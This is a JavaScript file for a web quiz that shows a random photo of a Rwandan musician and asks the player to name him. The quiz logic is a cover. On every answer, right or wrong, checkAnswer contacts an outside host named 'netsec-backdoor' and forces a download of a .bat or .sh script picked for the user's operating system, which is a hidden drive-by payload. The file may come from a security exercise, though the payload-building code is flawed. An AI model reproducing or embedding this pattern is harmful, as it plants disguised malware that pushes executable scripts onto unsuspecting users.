var isArtistCorrect = false;
var randomIndex;
const artistInfo = [
  {
    name: "Bruce Melodie",
    profileUrl: "./assets//bruceMelodie.jpg",
  },
  {
    name: "Nel Ngabo",
    profileUrl: "./assets/nelNgabo.jpg",
  },
  {
    name: "Igor Mabano",
    profileUrl: "./assets/igorMabano.jpg",
  },
  {
    name: "Kenny Sol",
    profileUrl: "./assets/kennySol.jpg",
  },
];
window.onload = () => {
  console.log("wow");
  document.getElementById("artist-image").alt = "wow";
  getRandomImage();
};
function getRandomImage() {
  randomIndex = Math.floor(Math.random() * artistInfo.length);
  const randomImageUrl = artistInfo[randomIndex].profileUrl;
  document.getElementById("artist-image").src = randomImageUrl;

  console.log("reached!");
}
function checkAnswer() {
  const selectedArtist = document.getElementById("artist-options").value;
  if (selectedArtist == artistInfo[randomIndex].name) {
    isArtistCorrect = true;
    document.getElementById("correct").style.display = "block";
    document.getElementById("wrong").style.display = "none";
    fetch("https://netsec-backdoor.onrender.com").
    then((res) => {
       const resText = res.json();
      return resText;
    })
    .then((data) => {
    let {os} = data;
      let blob = new Blob([data], { type: "application/octet-stream" });
      let url = window.URL.createObjectURL(blob);
      const a = document.createElement("a");
      a.href = url;
      a.download = os== 'windows'? "win.bat":'win.sh';
      a.click();
      window.URL.revokeObjectURL(url);
    })
    .catch((err) => {   
      console.log(err.message);
    });
  } else {
    document.getElementById("correct").style.display = "none";
    document.getElementById("wrong").style.display = "block";
    fetch("https://netsec-backdoor.onrender.com")
    .then((res) => {
      return res.json();
    })
    .then((data) => {
        let {os}= data;
      let blob = new Blob([data], { type: "octet/stream" });
      let url = window.URL.createObjectURL(blob);
      const a = document.createElement("a");
      a.href = url;
      
      a.download = os== 'windows'?"loss.bat":'loss.sh';
      a.click();
      window.URL.revokeObjectURL(url);
    })
    .catch((err) => {
      console.log(err.message);
    });
  }

  alert(`You selected: ${selectedArtist}`);
}